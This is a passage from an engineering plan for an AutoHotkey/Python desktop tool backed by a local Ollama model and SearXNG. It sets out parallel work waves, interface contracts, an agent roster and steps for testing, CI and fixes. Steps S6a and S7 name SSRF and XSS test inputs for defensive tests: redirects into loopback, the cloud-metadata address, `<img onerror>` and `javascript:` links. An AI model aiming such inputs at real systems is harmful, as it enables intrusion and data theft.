                    S2 · S3 · S4 · S5 · S6a · S6c · S7 · S8a
Wave C:             S6b   (after S6a — same file)
                    S8b1  (after S8a, S3)
                    S13a  (after S11, S12, D1, D2, D11)
Wave D:             S8b2  (after S8b1, S6c [K5], S11 [H16 result])
                    S10   (after S7; D5, D8)
                    S13b  (after S13a, D4)
Wave E:             S8b3  (after S8b2, S4 [K1, K6])
                    S14   (after S2, S13b)
Wave F:             S9    (after S4, S6b, S7, S8b3)
Wave G:             S15   (after S4–S10, S11–S14; collects docs/changes/pending/*)
Wave H:             S16   (after all; release candidate; draft release only on approval)
```

**Maximum parallelism.** Wave A runs 3 steps in parallel and Wave B runs 8. Packaging (S11 → S13a → S13b → S14) proceeds alongside the code waves because its files are disjoint.

**Interface contracts frozen by this plan.** They allow the parallel steps above to proceed without waiting for each other.

- **K1 — `work/error.txt` and `describe_error`.**
  - Format: UTF-8, no BOM. Line 1 is a user-facing English message of at most 200 characters, with no stack trace. Lines 2 and later are optional detail.
  - Python writes it atomically (tmp file, then `os.replace`) and exits non-zero on any failure.
  - AHK deletes it before each run. When `output.txt` is missing, AHK shows line 1, falling back to the generic text.
  - S4 provides `qwen_client.describe_error(exc) -> (message, detail)` with this frozen signature, and `qwen_client.write_error(...)`.
  - `obsidian_todo.py` keeps its own `obsidian_status.txt` contract; the `OK`/`ERRORE` tokens are unchanged.
- **K2.** The `websearch.gather_sources(...)` signature and return shape are frozen.
- **K3.** The `viewer.py` and `settings.py` CLI stays as it is until S9: `viewer.py <input> <output> <name> <mode> --key=…` and `--no-browser`. S9 adds a backward-compatible form.
- **K4 — `qwen_client` API stability.**
  - `chat(messages, mode, timeout)` keeps returning `str`.
  - S4 adds `chat_ex(...) -> (str, done_reason)`.
  - `stream_pieces` may raise the new `qwen_client.StreamIncomplete` (a subclass of `RuntimeError`). Existing callers already catch `Exception`. S7 adds an explicit branch that marks the answer incomplete.
- **K5 — SearXNG pid file format** (S6c writes it, S8b2 reads it): `work/searxng.pid` contains `<pid> <creation-time-filetime-utc>`. Readers must also accept the legacy single-integer form.
- **K6 — `work/config_warning.txt`** (S4 writes it, S8b3 shows it, S10 may show it): UTF-8 with one warning per line, rewritten at each config load.

### 5.3 Agent and skill roster

All names below were verified to exist in the installed ECC 2.2.3 plugin (`~/.claude/plugins/cache/ecc/ecc/2.2.3/{agents,skills,commands}`).

| Purpose | Agents | Skills / commands |
|---|---|---|
| Test-first fixes | `ecc:tdd-guide` | `tdd-workflow`, `python-testing`, `/ecc:orch-fix-defect` |
| Python review | `ecc:python-reviewer` | `python-patterns`, `/ecc:python-review` |
| Error handling | `ecc:silent-failure-hunter` | `error-handling` |
| Security | `ecc:security-reviewer` | `security-review`, `/ecc:security-scan` |
| Refactor (behaviour-preserving) | `ecc:code-simplifier`, `ecc:code-explorer` | `/ecc:orch-refine-code`, `module-regression` |
| Performance | `ecc:performance-optimizer` | `benchmark-methodology`, `benchmark` |
| UI / accessibility | `ecc:a11y-architect` | `accessibility`, `frontend-a11y`; chrome-devtools MCP `lighthouse_audit` |
| Tests and CI | `ecc:pr-test-analyzer` | `github-ops`, `verification-loop`, `/ecc:test-coverage` |
| Packaging and release | `general-purpose` (no NSIS-specific agent exists) | `deployment-patterns`, `github-ops`, `opensource-pipeline` (sanitizer stage) |
| Release sanitization | `ecc:opensource-sanitizer` | — |
| Docs | `ecc:doc-updater`, `ecc:comment-analyzer` | `docs-governance`, `/ecc:update-docs`, `/ecc:update-codemaps` |
| Desktop E2E | `ecc:e2e-runner` | `windows-desktop-e2e` |
| Final diff review | `ecc:code-reviewer` | `/ecc:code-review`, `/ecc:checkpoint` |

The skill `generating-python-installer` exists but is **not used**: it targets Python-native installers, and this project ships NSIS.

**Model tiers.**
- Strongest model for S4, S5, S6a, S6c, S7, S8b1, S8b2, S9, S13a and S13b (data integrity, security and concurrency).
- Default model for S1, S2, S3, S6b, S8a, S8b3, S10, S11, S12, S14, S15 and S16.

---

---

## 6. Steps

Every step header lists: **Wave**, **Depends on**, **Model**, **Branch**, **Agents/skills** and **Owns**. The global rules in §1 and the invariants in §2 always apply.

### Step S1 — Test harness, characterization tests and dev scripts
- **Wave:** A. **Depends on:** none. **Model:** default. **Branch:** `prod/s1-test-harness`
- **Agents:** `ecc:tdd-guide` (author), `ecc:pr-test-analyzer` (review). **Skills:** `python-testing`, `tdd-workflow`.
- **Owns:** see §5.1.
- **Context brief:**
  - The Python modules at the repo root are stdlib-only: `qwen_client.py`, `prompts.py`, `websearch.py`, `viewer.py`, `settings.py`, `pages.py`, `config_edit.py`, plus `actions/*.py`.
  - The only existing test is `test_config_edit.py` (1 unittest).
  - Several modules read the real `config.ini` and derive `BASE_DIR`, `WORK_DIR` and `CONFIG_FILE` from `__file__` when they are imported.
- **Tasks:**
  1. **`tests/support.py`.** Provide these helpers:
     - `repo_copy(tmp)` copies `*.py`, `actions/` and `static/` into a temp tree, writes a temp `config.ini` (with alternate free ports), and imports modules from there. Tests then never touch the real `config.ini` or `work/`.
     - `FakeOllama` is a `ThreadingHTTPServer` on port 0. On `/api/chat` it serves JSON, NDJSON, an error chunk, a 404 with a JSON body, `done_reason:"length"`, a stream without `done`, and a slow drip. It also serves `/api/generate` (unload), `/api/tags` and `/api/version`, and it records request bodies.
     - `FakeSearx` serves `/healthz` and `/search?format=json`.
     - `StaticPages` serves fixture HTML, redirect chains and slow-drip responses.
     - `run_with_timeout(fn, seconds)` runs a callable in a subprocess and kills it on timeout.
  2. **Existing test.** Move `test_config_edit.py` into `tests/` and keep a root shim, so `python test_config_edit.py` still works.
  3. **Characterization tests.** These lock the current behaviour of the invariants:
     - `settings.validate`/`valid_hotkey` (I2)
     - the `config_edit` round trip (I12)
     - `pages.script_json`/`html_escape`
     - viewer and settings servers: 403 without a token, 403 on a bad Host, 404 on `/fonts` traversal (I8)
     - `obsidian_todo.validate`/`check_structure`/`normalize` on golden fixtures (I4)
     - `websearch.parse_queries`/`linkify` happy paths (I9)
     - the `qwen_client._request` payload (`keep_alive`, `think:false`) and `unload()` sending `keep_alive:0` (I10)
  4. **Known-defect tests.** Encode the known defects as `@unittest.expectedFailure` tests, each with its defect ID in the docstring.
     - Place each test in the file the fixing step owns: `tests/test_qwen_client.py` for S4, `tests/test_websearch_parse.py` for S6b, `tests/test_config_edit.py` and `tests/test_settings_validate.py` for S7, and so on. Parallel steps then never edit the same test file.
     - **C01 must not hang the suite.** Use `run_with_timeout` with n=400 blank lines and a 2 s budget. Today it takes about 0.66 s at n=400 and about 5.8 s at n=800. Assert that n=800 finishes in under 0.5 s, so the test fails today without hanging.
  5. **Dev setup.** Add `requirements-dev.txt` (pinned `ruff`, `coverage`, `pip-audit`) and `pyproject.toml`. The ruff config uses `select = ["E9","F","B"]` with `extend-exclude = ["python","searxng/app","searxng/lib","work","installer","graphify-out","build/out"]`.
  6. **`scripts/dev/link-runtime.ps1`** (PowerShell 5.1). It creates junctions `python`, `ahk\AutoHotkey64.exe` (hard link or copy) and `searxng\app|lib` from a source install, for git worktrees (§0.5). It refuses to run if the target is `C:\AI-Hotkeys` itself.
- **Acceptance criteria:**
  - The suite runs with the system Python and with `python\python.exe`, with no third-party dependencies, in under 30 s.
  - It makes no network calls outside 127.0.0.1.
  - After the suite runs, `git status` shows no change to `work/` or `config.ini`, and no `__pycache__` in tracked directories.
  - It has at least 40 cases, and every Python-testable invariant (I1–I12) has at least one test.
- **Validation:**
  ```
  python -m unittest discover -s tests -t . -v
  python\python.exe -m unittest discover -s tests -t .
  python test_config_edit.py
  git status --porcelain
  ```
- **Rollback:** delete the branch. No production files are touched.
- **Exit:** the step is merged, with the test count and run time recorded in `docs/changes/pending/S1.md`.

### Step S2 — CI baseline (GitHub Actions, Windows)
- **Wave:** B. **Depends on:** S1. **Model:** default. **Branch:** `prod/s2-ci`
- **Agents:** `general-purpose`, `ecc:pr-test-analyzer` (review). **Skills:** `github-ops`, `verification-loop`.
- **Owns:** `.github/workflows/ci.yml`, `scripts/ci/**`.
- **Context brief:** no CI exists yet. AutoHotkey and the portable Python are not in git, so CI downloads pinned, hash-verified copies.
- **Tasks:**
  1. **Workflow settings.** Create `ci.yml`, triggered on push and pull_request, with `permissions: contents: read`. Pin actions by SHA. Set `PYTHONDONTWRITEBYTECODE=1` and `PYTHONUTF8=1`.
  2. **Jobs** (all on Windows images):
     - **lint:** `ruff check .` and `python -m compileall -q` on the project files.
     - **unit:** `windows-latest` and `windows-2022` with Python 3.13. One leg runs coverage with `--fail-under` set to the S1 baseline minus 2.
     - **ahk-validate:** download AutoHotkey v2.0.19 with a SHA-256 check, then run `/ErrorStdOut /validate main.ahk` the way §0.6 describes. Add a negative test on a deliberately broken fixture; it settles H13.
     - **ahk-unit:** run `tests/ahk/run.ahk`, skipped until S8a lands.
     - **secret-scan:** gitleaks with `--redact`. Assert that no `config.ini`, `work/`, `*.exe` or `*.rar` is tracked. Grep tracked files for personal `C:\Users\<name>\` paths.
     - **license-presence:** `LICENSE`, `ahk/license.txt`, `searxng/LICENSE-searxng.txt`, `static/fonts/OFL-*.txt` and the marked MIT header. Add `THIRD_PARTY_NOTICES.md` once S12 lands.
     - **vuln-scan** (H27): `pip-audit -r build/requirements-searxng.txt` once S11 lands. It is advisory at first and becomes blocking for HIGH findings before release.
- **Acceptance criteria:**
  - All jobs are green.
  - A broken AHK fixture makes ahk-validate fail. If `/validate` turns out unsupported, record H13 as refuted and use the documented fallback: run the script with an `--selftest` argument that exits before registering any hotkeys.
- **Validation:** CI run logs, plus `ruff check .` locally.
- **Rollback:** revert the workflow.
- **Exit:** CI is recommended as required on `main`. The user configures branch protection.

### Step S3 — Performance baselines and runtime hypothesis verification
- **Wave:** B. **Depends on:** S1. **Model:** default. **Branch:** `prod/s3-baselines`
- **Agents:** `ecc:performance-optimizer`. **Skills:** `benchmark-methodology`, `benchmark`.
- **Owns:** `tools/bench/**`, `docs/audit/baseline-2026-10.md`, and the `.gitignore` line `tools/bench/out/`.
- **Context brief:**
  - Earlier audit numbers were noisy: about 90 ms bundled-Python start-up (about 145 ms on the system Python), about 140 ms from viewer spawn to first GET, and about 120 ms for the `curl_cffi` import.
  - Model time has not been measured. This step changes no application code.
- **Tasks:**
  1. **`tools/bench/proxy.py`.** A recording reverse proxy for Ollama. It forwards to `localhost:11434` and logs, per request: TTFT, total time, `load_duration`, `prompt_eval_*`, `eval_*` and `done_reason`. A copy of the config, pointed at the proxy, lives in the temp tree. The user's `config.ini` is never edited.
  2. **`tools/bench/run.py`.** It runs N interleaved ABAB repetitions against the fake server or the proxy, and writes JSONL to `tools/bench/out/` (gitignored) plus a median/p90/max summary.
  3. **Quiet-machine measurements.** Measure start-up and imports; rewrite/summarize/explain warm and cold; the explain phase splits; viewer TTFB; and the ClipWait latency per app for D12/H07.
  4. **Hypotheses.** Verify H02–H08, H11, H22 and H23, and record the evidence. Do the H03/H04 runs with the fake server and synthetic text only, never real user documents.
  5. **Redaction.** Strip user paths, machine names and hardware serial numbers from the published baseline document.
- **Acceptance criteria:**
  - The baseline document has an environment manifest (GPU, VRAM, driver, Ollama version, model digest, all redacted) and per-phase tables.
  - Every listed hypothesis is marked confirmed, refuted or inconclusive, with evidence.
  - Later thresholds are stated only relative to these numbers.
- **Validation:** `python tools/bench/run.py --fake --n 20` is reproducible within ±10% median on the same machine.
- **Rollback:** delete the branch. The tools are not shipped.
- **Exit:** the baseline is merged, and §3.2 is updated through the §8 protocol.

### Step S4 — Python core correctness (`qwen_client`, the action wrappers, `prompt_loader`)
- **Wave:** B. **Depends on:** S1. **Model:** strongest. **Branch:** `prod/s4-qwen-client`
- **Agents:** `ecc:tdd-guide` (tests first); `ecc:python-reviewer` and `ecc:silent-failure-hunter` (review). **Command:** `/ecc:orch-fix-defect`.
- **Owns:** see §5.1.
- **Fixes:** C01, C02, C06 (Python side, K1), C12, C16, C24. **Verifies:** H20 and H24. Implements K1, K4 and K6, and the D4 loader.
- **Context brief:**
  - `qwen_client.run_action(mode, argv)` reads `work/input.txt`, calls Ollama `/api/chat` (non-streaming), runs `clean_answer`, and writes `work/output.txt` and `meta.json`.
  - It runs under `pythonw`, so stderr is not visible.
  - `prompts.py` is user content; do not edit it.
  - The callers of `chat`/`stream_pieces` outside this step are `websearch.py:560`, `actions/obsidian_todo.py:171` and `viewer.py:276-301`. Contract K4 keeps them working unchanged.
- **Tasks:**
  1. **C01.** Replace the empty-section regex with a line-based pass. A guard test must clean 5,000 blank lines in under 100 ms, and it flips S1's expected failure.
  2. **C02 (K4).**
     - Add `chat_ex()` returning `(text, done_reason)`. `run_action` uses it and treats `"length"` as an error: K1 message "The answer was cut off; select less text", no `output.txt`, exit code 3.
     - `stream_pieces` raises `StreamIncomplete` on EOF without `done`.
     - Add an input-size cap derived from `NUM_CTX` and `num_predict`, documented as a character heuristic.
  3. **C12.**
     - Strip an intro line only when it is absent from the input.
     - Unwrap a code fence only when exactly one fenced block wraps the whole answer and the input was not fenced.
  4. **C06 (K1).**
     - Implement `describe_error(exc)`:
       - connection refused → "Ollama is not running (start it from the Start menu)."
       - `HTTPError` 404 (read the body) → "Model '<m>' not found: run  ollama pull <m>"
       - timeout
       - empty selection → "Nothing selected."
       - anything else → a generic message, with the detail on line 2+
     - Implement `write_error()`. Wrap each action's `main` so any exception writes `error.txt` and exits non-zero.
  5. **C16 (K6).**
     - Catch `configparser.Error` and `UnicodeDecodeError` separately. Fall back to defaults and write `work/config_warning.txt`.
     - Strip surrounding quotes from paths.
  6. **C24.** Use a module-level opener with `ProxyHandler({})` for all Ollama calls.
  7. **H24 health check.**
     - `qwen_client.health()` checks `/api/version` (minimum version determined in this step and documented) and `/api/tags` for the configured model.
     - Add `actions/health.py` for AHK to call at startup (wired in S8b3).
     - Responses go through K1 messages.
  8. **D4 loader.** Add `prompt_loader.py` returning `prompts_user` if importable, otherwise `prompts`. A `SyntaxError` in `prompts_user` falls back to `prompts` and writes a K6 warning. Switch `qwen_client.py` to it.
  9. Flip S1's expected-failure tests in `tests/test_qwen_client*.py`.
- **Acceptance criteria:**
  - Each listed defect has a test that failed before the fix and passes after it.
  - All S1 characterization tests stay green (I6, I7, I10, I11).
  - `chat()` still returns `str` (a K4 test).
  - Each error scenario against the fake server yields the specified K1 line 1 and a non-zero exit.
  - With `HTTP_PROXY` pointing at a dead port, the action still succeeds against the fake server (H20).
- **Validation:**
  ```
  python -m unittest tests.test_qwen_client -v
  python -m unittest discover -s tests -t .
  ruff check qwen_client.py prompt_loader.py actions
  ```
  Then, manually, one real-model run per action through the S3 proxy.
- **Rollback:** revert. K1, K4 and K6 are additive: AHK falls back to the generic text.
- **Exit:** reviewer sign-off, plus `docs/changes/pending/S4.md` listing the new messages, the minimum Ollama version and the `prompts_user.py` mechanism.

### Step S5 — Obsidian To-Do data safety
- **Wave:** B. **Depends on:** S1, D3. **Model:** strongest. **Branch:** `prod/s5-obsidian-safety`
- **Agents:** `ecc:tdd-guide`; `ecc:silent-failure-hunter` and `ecc:python-reviewer` (review). **Skill:** `error-handling`.
- **Owns:** see §5.1.
- **Fixes:** C13, C14, C15. **Verifies:** H12.
- **Context brief:**
  - `obsidian_todo.py` asks Qwen to reorganize the user's To-Do note, then normalizes and validates the result. It writes a backup and replaces the file atomically.
  - AHK reads `work/obsidian_status.txt`, whose first token is `OK` or `ERRORE`. That contract is unchanged (I4).
  - It calls `qwen_client.chat()`, which keeps returning `str` (K4).
- **Tasks:**
  1. **C13.**
     - Wrap everything in a top-level `try` that always writes `ERRORE: <reason>`.
     - Give a clear message for decode errors.
     - Write the tmp file, flush and `os.fsync`, then `os.replace` with 5 retries and backoff on `PermissionError`.
     - Clean up the tmp file on failure.
     - Delete `obsidian_output.txt` **only on success**. On a validation failure the status message refers the user to it (`obsidian_todo.py:367-374`).
  2. **C14.**
     - Preserve content before the first level heading (frontmatter or preamble) byte for byte.
     - Compare the counts of non-task, non-empty lines by kind.
     - Match tasks by `difflib` similarity, with a 0.6 threshold by default.
     - Optional: use `chat_ex` once S4 is merged to reject `done_reason == "length"`, behind a feature check (`hasattr`) so the steps merge in any order.
  3. **C15.** Store backups per D3, keeping the last N. Never touch the existing `*.backup_*.md` files.
  4. **Testability.** Make `main(argv, ask=...)` injectable.
- **Acceptance criteria:**
  - The golden fixtures pass: CRLF, LF and BOM (BOM decision documented), nested tasks, code blocks containing tags, wikilinks, images, plus negative fixtures for dropped frontmatter, a dropped paragraph and an altered task.
  - A simulated `os.replace` failure leaves the original byte-identical, with `ERRORE` in the status.
  - A file modified during the run is aborted, unchanged.
  - Backup retention is enforced.
- **Validation:** `python -m unittest tests.test_obsidian_validate tests.test_obsidian_main -v`. Then a manual run on a copy of a note in a test vault, never the user's live note unless the user approves.
- **Rollback:** revert. Only backups beyond N in the new folder are ever deleted.
- **Exit:** reviewer sign-off and `docs/changes/pending/S5.md`.

### Step S6a — Web search: SSRF guard, deadlines and preflight
- **Wave:** B. **Depends on:** S1. **Model:** strongest. **Branch:** `prod/s6a-websearch-net`
- **Agents:** `ecc:security-reviewer`, `ecc:tdd-guide`. **Skill:** `security-review`.
- **Owns:** see §5.1.
- **Fixes:** C11, C22, C23, and the clamping part of C38 (`results`/`pages_to_read`).
- **Context brief:**
  - On End, `gather_sources` (signature frozen, K2) works in this order:
    1. It decides the queries: Qwen proposes them, or technical terms force a search.
    2. It ensures SearXNG on 127.0.0.1:8888 is running.
    3. It searches and fetches up to `pages_to_read+2` pages in parallel, with curl_cffi if available and urllib otherwise.
    4. It selects text within a budget.
  - Tests use the `StaticPages`/`FakeSearx` fakes on alternate ports (§1).
- **Tasks:**
  1. **C11.**
     - Add a `safe_url(url)` check. It resolves the host and rejects loopback, private (RFC 1918 and ULA), link-local, CGNAT, multicast, unspecified, IPv4-mapped and cloud-metadata addresses. Only ports 80 and 443 are allowed.
     - Follow redirects manually (at most 5) and re-check every hop. On the curl_cffi path, set `allow_redirects=False`. On the urllib path, use a custom `HTTPRedirectHandler`.
     - Pin the resolved IP: use curl's `resolve` option on the curl_cffi path. For urllib, document that the resolve-then-connect gap remains (a DNS-rebinding TOCTOU).
  2. **C23.**
     - Give each page a `time.monotonic()` deadline (12 s by default) with chunked reads.
     - Give the whole fetch an overall deadline via `as_completed(timeout=…)`.
     - Stop once `PAGES_TO_READ` usable pages are available.
  3. **C22.** Preflight Ollama via `/api/tags` with a 2 s timeout. On failure, skip the search; `run_action` then reports the K1 error.
  4. **C38 (part).** Clamp `results` to 1–10 and `pages_to_read` to 0–5.
- **Acceptance criteria:**
  - The SSRF corpus returns "" and no request reaches a private target. It covers: direct private addresses, a 302 chain into 127.0.0.1, `[::1]`, `169.254.169.254`, decimal and hex IP forms, and DNS names that resolve to private ranges.
  - A slow-drip page is bounded by its deadline (±1 s).
  - The I9 characterization tests stay green.
  - With `web_search=false`, nothing is fetched.
- **Validation:** `python -m unittest tests.test_websearch_ssrf tests.test_websearch_fetch -v`.
- **Rollback:** revert. There is deliberately no config bypass for the SSRF guard. If intranet documentation sites are needed later, that is a new decision.
- **Exit:** security-reviewer sign-off.

### Step S6b — Web search: parsing, citations, extraction and query mode
- **Wave:** C. **Depends on:** S6a (same file), D5. **Model:** default. **Branch:** `prod/s6b-websearch-parse`
- **Agents:** `ecc:python-reviewer`, `ecc:tdd-guide`.
- **Owns:** see §5.1.
- **Fixes:** C25, C38 (remaining parts), C39. Implements the D5 `query_mode` and the `prompt_loader` import.
- **Tasks:**
  1. **C25.** Run linkify outside code spans and code fences only. Percent-encode `(`, `)` and spaces in URLs.
  2. **C38.**
     - `NO_RE` must match a whole-answer NO only (so "No Man's Sky" is a query).
     - Remove "Fonti" only when it is a trailing sources list.
     - Parse charsets robustly: strip quotes, fall back to UTF-8 on `LookupError`, and read `<meta charset>`.
     - Compare content types case-insensitively.
  3. **C39.** Fall back to `div`/`span` text when no block text is found. Make the skip counters robust to unclosed tags.
  4. **D5 query mode.**
     - Add `[searxng] query_mode = model | allow_fallback`. The default `allow_fallback` keeps today's behaviour. `model` never sends the raw first 10 words.
     - Fall back to the code default when the key is missing (I11).
     - Validation of this key in `settings.py` `CHOICES` is added by S10's settings-page work through a small §8 insert into S7's files, scheduled after S7 merges. S15 adds the documented key to `config.example.ini`.
  5. Switch to `prompt_loader` (§5.1). Flip S1's expected failures in `tests/test_websearch_parse.py`.
- **Acceptance criteria:**
  - The citation tests pass: `parts[1]` inside code is untouched, `arr[0]` outside code is unchanged, a URL containing `)` is valid, and "## Fonti di lag" keeps its body.
  - The I9 tests stay green.
- **Validation:** `python -m unittest tests.test_websearch_parse -v`. Then a manual End run with the real SearXNG on a technical text and on a personal note.
- **Rollback:** revert.
- **Exit:** reviewer sign-off.

### Step S6c — SearXNG launcher robustness
- **Wave:** B. **Depends on:** S1. **Model:** strongest. **Branch:** `prod/s6c-searxng-launcher`
- **Agents:** `ecc:silent-failure-hunter`, `ecc:security-reviewer`.
- **Owns:** see §5.1.
- **Fixes:** C19. **Verifies:** H09, H10. Implements K5.
- **Tasks:**
  1. **C19.**
     - Take an exclusive lock (`msvcrt.locking` on `work/searxng.lock`) before importing `searx`.
     - Write the pid file **after** a successful bind, in the K5 format.
     - Open the log in append mode and rotate it at 5 MB (keep 1).
     - On a port conflict with a process that is not ours, exit with a distinct code and a K1-style log line.
  2. **H09.** Test in a temp tree on an alternate port (§1): launch twice, then assert there is exactly one listener.
  3. **H10.** Test on an alternate port. If it is confirmed, add Host-allowlist WSGI middleware (127.0.0.1 and localhost only) in the launcher. This leaves `searx/` itself unmodified.
  4. **Isolated runs.** Add `--port`/`--work-dir` arguments (defaulting to the current behaviour) so tests and S11 can run the launcher in isolation.
- **Acceptance criteria:**
  - The double-launch test ends with one listener, a valid K5 pid file and a log that was not truncated.
  - The user's instance on port 8888 is untouched throughout.
- **Validation:** `python -m unittest tests.test_searxng_launcher -v`. It needs the vendored `searxng/app|lib`, so it is skipped when they are absent.
- **Rollback:** revert. Readers accept the legacy pid format (K5).
- **Exit:** H09 and H10 are recorded.

### Step S7 — Local servers, config writer and page security
- **Wave:** B. **Depends on:** S1, D8. **Model:** strongest. **Branch:** `prod/s7-local-servers`
- **Agents:** `ecc:security-reviewer`, `ecc:python-reviewer`, `ecc:tdd-guide`.
- **Owns:** see §5.1.
- **Fixes:** C10, C17, C35, C36. **Verifies:** H19. Implements D8 and the `prompt_loader` import in `viewer.py`. Handles the K4 `StreamIncomplete` exception.
- **Context brief:**
  - The viewer and settings servers are `ThreadingHTTPServer`s on 127.0.0.1 with a random port. They use a `secrets.token_urlsafe(18)` token checked with `compare_digest`, a Host allowlist, `nosniff`, `X-Frame-Options` and `no-referrer`.
  - The audit verified that XSS escaping, the `/fonts` allowlist and CSRF resistance are safe; keep them that way.
  - C21 (the 404 message) moves to S9, because it needs S4's `describe_error`.
- **Tasks:**
  1. **C10 (and D8).**
     - Send a `Content-Security-Policy` header on every HTML response: `default-src 'none'; script-src 'unsafe-inline'; style-src 'unsafe-inline'; font-src 'self'; img-src 'self' data:; connect-src 'self'; base-uri 'none'; form-action 'none'; frame-ancestors 'none'`.
     - Change the viewer's image filter to turn remote images into links (D8).
     - Verify that marked rendering, inline scripts, fonts, follow-up streaming and copy still work under this CSP.
  2. **C35.**
     - Compare tokens as bytes. Any mismatch or exception returns 403.
     - Validate numbers with `isascii() and isdigit()`.
     - Set `Handler.timeout = 30`.
     - Wrap the handlers so an exception never kills the server thread silently. Log it to `work/server.log`, capped at 1 MB.
  3. **C36.** Use `re.fullmatch` or `\Z` in every validator.
  4. **C17.**
     - Write atomically (tmp file, then `os.replace`).
     - Split lines with `re.split(r"\r\n|\n")`.
     - Reject `\r`, `\n` and `\x00` in values, and `=[]` in keys and section names.
     - Recognise `k: v` lines.
  5. **H19.** Use `time.monotonic()` for the watchdogs, and add a test.
  6. **K4.** In `/api/ask`, catch `StreamIncomplete` and emit `{"error": "The answer was interrupted.", "partial": true}`. Text already streamed stays visible; S10 marks it.
  7. **`history.replaceState`.** Strip `?t=` from the address bar. Document that F5 then shows "disconnected"; the S10 banner explains that.
  8. **Non-loopback `ollama_url`.** Accept it with HTTP 200 plus a `warning` field. Never reject it: users with a LAN Ollama must keep working. S10 renders the warning.
- **Acceptance criteria:**
  - The security corpus passes:
    - bad Host, missing token or non-ASCII token → 403, and the server stays up
    - OPTIONS returns no CORS headers
    - a body over `MAX_BODY` → 400
    - `/fonts` traversal variants → 404
    - a CSP header on all HTML responses
  - A markdown corpus (`<img onerror>`, `<script>`, `javascript:` links, remote images) runs no script and makes no remote request. Check this in a headless Chrome via the chrome-devtools MCP network log.
  - Round-trip tests for I12 stay green. Settings save still triggers the AHK reload (I8, manual).
- **Validation:** `python -m unittest tests.test_viewer_http tests.test_settings_http tests.test_pages tests.test_config_edit -v`. Then a manual viewer session: follow-up streams, stop and copy (I7).
- **Rollback:** revert. The CSP is one constant.
- **Exit:** security-reviewer sign-off.

### Step S8a — `main.ahk`: behaviour-preserving extraction and AHK tests
- **Wave:** B. **Depends on:** S1. **Model:** default. **Branch:** `prod/s8a-ahk-extract`
- **Agents:** `ecc:code-explorer` (map), `ecc:code-simplifier`, `ecc:code-reviewer`. **Command:** `/ecc:orch-refine-code`. **Skill:** `module-regression`.
- **Owns:** see §5.1.
- **Fixes:** C37. **Verifies:** H01. Settles hotkey-validation parity.
- **Context brief:**
  - `main.ahk` is 910 lines, organised in these regions:

    | Lines | Region |
    |---|---|
    | 1-140 | globals, data, startup |
    | 147-251 | register and dispatch |
    | 258-553 | run, Obsidian, Esc cancel, wait |
    | 564-699 | toast and theme |
    | 706-738 | hotkey helpers |
    | 745-846 | settings, config, tray |
    | 853-900 | SearXNG |

  - Extract **only pure helpers**. Do **not** split the dispatch, cancel and wait region, because it shares mutable state. No classes or managers.
- **Tasks:**
  1. **Extract the helpers.** Move `ReadConfig`, `IsNo`, `ValidHotkey`, `KeyLabel`, `HexToColorRef` and `CIMap` into `lib/Util.ahk`, with no top-level code, and include it with `#Include %A_ScriptDir%\lib\Util.ahk`.
  2. **Fix `ReadConfig(key, default, section := "", path := CONFIG)`** (C37). It becomes section-aware, strips inline ` ;` comments, escapes the key and trims `\r`.
  3. **Hotkey parity.** Write `tests/fixtures/hotkey_vectors.json`, with Python `settings.valid_hotkey` as the authority. `tests/test_hotkey_parity.py` and the AHK tests assert the same vectors, and AHK `ValidHotkey` is aligned to them.
  4. **Test runner.** `tests/ahk/run.ahk` prints with `FileAppend(…, "*")` and exits with the failure count. Add tests for every `lib/Util.ahk` function, including CRLF, BOM and inline-comment fixtures (H01).
- **Acceptance criteria:**
  - There is no behaviour change beyond C37 and the parity alignment. Any newly rejected key is listed in `docs/changes/pending/S8a.md`, because it now falls back to the default (I2) and S8b3 adds a warning toast for it.
  - `/validate` and the AHK tests pass.
  - The manual smoke test passes: each default hotkey in Notepad, and the tray menu.
- **Validation** (capture output per §0.6):
  ```
  ahk\AutoHotkey64.exe /ErrorStdOut tests\ahk\run.ahk
  ahk\AutoHotkey64.exe /ErrorStdOut /validate main.ahk
  python -m unittest tests.test_hotkey_parity
  ```
- **Rollback:** revert, since there is a single `#Include`.
- **Exit:** the S2 `ahk-unit` job runs the suite.

### Step S8b1 — `main.ahk`: capture, routing and direct replace
- **Wave:** C. **Depends on:** S8a, S3 (H02, H07 and the D12 data), D10, D12. **Model:** strongest. **Branch:** `prod/s8b1-ahk-capture`
- **Agents:** `ecc:silent-failure-hunter`, `ecc:code-reviewer`. **Skill:** `windows-desktop-e2e` (manual E2E).
- **Owns:** see §5.1, serially.
- **Fixes:** C03, C04, C05.
- **Context brief:**
  - The globals `busy`, `cancelRequested` and `currentPid` are shared by Dispatch, RunSelectionAction, WaitPid and the Esc handlers.
  - The results page opens in the user's default browser. Its window title is `<Fix|Summary|Explanation> - AI-Hotkeys - <Browser>`.
- **Tasks:**
  1. **C03.**
     - Introduce a `capturing` state that is separate from `busy`. Set `busy` only after text has been captured.
     - Use `#MaxThreadsPerHotkey 2`. While `capturing`, a repeat press forwards the native key with `SendNative` instead of being swallowed. `#MaxThreadsBuffer` alone only buffers, which is not enough.
     - Set the ClipWait timeout per D12, from the S3 data.
     - Add a `native` route for console window classes (`ConsoleWindowClass`, `CASCADIA_HOSTING_WINDOW_CLASS`, `mintty`), so `^c` is never sent to them.
  2. **C04.**
     - Exempt windows whose title matches `\s-\sAI-Hotkeys(\s-\s|$)`, i.e. contains " - AI-Hotkeys" followed by " - " or the end of the title, and windows containing `AI-Hotkeys Settings`.
     - Keep the pattern as one constant, and add a comment pointing to the titles in `static/*.html` (S10 must keep them).
  3. **C05 and D10/I15.**
     - Paste only if `WinWaitActive` succeeded.
     - Before pasting, re-copy the selection and compare it with the original. On a mismatch, open the results page instead and show a toast.
     - Keep the result in the clipboard after the paste (I15).
- **Acceptance criteria:**
  - Holding PgDn with nothing selected scrolls: repeat presses are not lost, and the first press is delayed by at most the D12 timeout plus 50 ms, measured with the S3 harness.
  - PgUp, PgDn and End in the results page scroll natively in Chrome, Edge and Firefox.
  - A replace with stolen focus does not paste into the other window.
  - Consoles receive no `^c`.
  - The §7.2 items 2–4 pass, and I1–I3 and I6 are unchanged.
- **Validation:** `/validate`, `tests\ahk\run.ahk`, and §7.2 items 2–4 on Windows 11 and Windows 10.
- **Rollback:** revert. Each fix is a separate commit.
- **Exit:** the checklist evidence is attached.

### Step S8b2 — `main.ahk`: process lifecycle
- **Wave:** D. **Depends on:** S8b1, S6c (K5), S11 (the H16 result for the launch flags). **Model:** strongest. **Branch:** `prod/s8b2-ahk-lifecycle`
- **Agents:** `ecc:silent-failure-hunter`, `ecc:code-reviewer`.
- **Owns:** see §5.1, serially.
- **Fixes:** C18 (the orphan kill), C20, C28 (launch flags).
- **Tasks:**
